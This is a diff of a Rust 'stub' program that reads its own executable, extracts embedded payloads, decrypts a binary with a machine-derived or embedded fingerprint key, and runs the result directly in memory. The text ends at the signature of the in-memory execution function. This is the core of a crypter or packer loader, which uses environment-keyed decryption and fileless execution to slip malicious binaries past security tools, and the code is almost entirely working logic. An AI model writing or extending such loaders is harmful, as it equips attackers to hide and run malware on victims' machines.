@@ -9,6 +9,7 @@ use common::embed;
 #[cfg(unix)]
 use std::os::fd::{FromRawFd};
 
+
 fn main() {
     println!("[*] Stub running...");
 
@@ -16,36 +17,59 @@ fn main() {
     let exe_path = std::env::current_exe().unwrap();
     println!("[*] Current exe path: {:?}", exe_path);
     let exe_data = std::fs::read(&exe_path).expect("Failed to read current executable");
-    println!("[+] ({} bytes)", exe_data.len());
-    // 2. Extract encrypted payload
-    let maybe_encrypted = embed::extract_from_stub(&exe_data);
-    if maybe_encrypted.is_none() {
+    println!("[+] Read {} bytes", exe_data.len());
+
+    // 2. Extract all embedded payloads
+    let payloads = embed::extract_from_stub(&exe_data);
+    println!("[+] Extracted {} payload(s)", payloads.len());
+
+    if payloads.is_empty() {
         eprintln!("❌ No embedded binary found in stub.");
         std::process::exit(1);
     }
-    let encrypted = maybe_encrypted.unwrap();
-    println!("[+] Extracted encrypted payload ({} bytes)", encrypted.len());
 
-    // 3. Decrypt using fingerprint
-    let fp = fingerprint::generate_fingerprint();
-    println!("[*] Fingerprint used: {}", fp);
+    // 3. Determine decryption strategy based on payload count
+    let (fingerprint, encrypted_binary) = match payloads.len() {
+        1 => {
+            // Only encrypted binary embedded - generate fingerprint from machine
+            println!("[*] Single payload detected - using machine fingerprint");
+            let fp = fingerprint::generate_fingerprint();
+            println!("[*] Generated fingerprint: {}", fp);
+            (fp, &payloads[0])
+        },
+        2 => {
+            // Two payloads: [fingerprint, encrypted_binary]
+            println!("[*] Two payloads detected - using embedded fingerprint");
+            let fp = String::from_utf8(payloads[0].clone())
+                .expect("Failed to decode fingerprint from payload");
+            println!("[*] Using fingerprint: {}", fp);
+            (fp, &payloads[1])
+        },
+        count => {
+            eprintln!("❌ Unexpected number of payloads: {}. Expected 1 or 2.", count);
+            std::process::exit(1);
+        }
+    };
 
-    let maybe_decrypted = crypto::decrypt_binary(&fp, &encrypted);
-    if maybe_decrypted.is_none() {
-        eprintln!("❌ Decryption failed. Possibly wrong fingerprint or corrupted data.");
-        std::process::exit(1);
-    }
-    let decrypted = maybe_decrypted.unwrap();
+    println!("[+] Encrypted binary size: {} bytes", encrypted_binary.len());
+
+    // 4. Decrypt the binary
+    println!("[*] Decrypting binary...");
+    let decrypted = crypto::decrypt_binary(&fingerprint, encrypted_binary)
+        .unwrap_or_else(|| {
+            eprintln!("❌ Decryption failed. Wrong fingerprint or corrupted data.");
+            std::process::exit(1);
+        });
+
     println!("[+] Decryption succeeded. Decrypted binary size: {} bytes", decrypted.len());
 
-    // 4. Execute in memory
+    // 5. Execute in memory
     println!("[*] Attempting to execute decrypted binary in memory...");
     if let Err(e) = run_in_memory(&decrypted) {
         eprintln!("❌ Failed to run binary: {}", e);
         std::process::exit(1);
     }
 }
-
 /// Execute a binary directly from memory (Unix)
 #[cfg(unix)]
 fn run_in_memory(binary: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
